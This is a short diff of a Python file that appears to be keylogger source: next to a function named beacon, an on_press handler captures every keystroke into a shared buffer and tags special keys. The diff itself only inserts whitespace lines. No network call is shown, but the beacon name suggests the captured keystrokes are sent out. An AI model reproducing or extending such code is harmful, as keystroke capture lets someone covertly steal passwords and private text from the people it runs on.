@@ -23,11 +23,14 @@ def beacon():
 def on_press(key):
     with lock:
         try:
+            
             buffer.append(key.char)
         except AttributeError:
+            
             if key == keyboard.Key.space:
                 buffer.append(" ")
             else:
+                
                 key_str = str(key).replace("Key.", "")
                 buffer.append(f" [{key_str}] ")
 
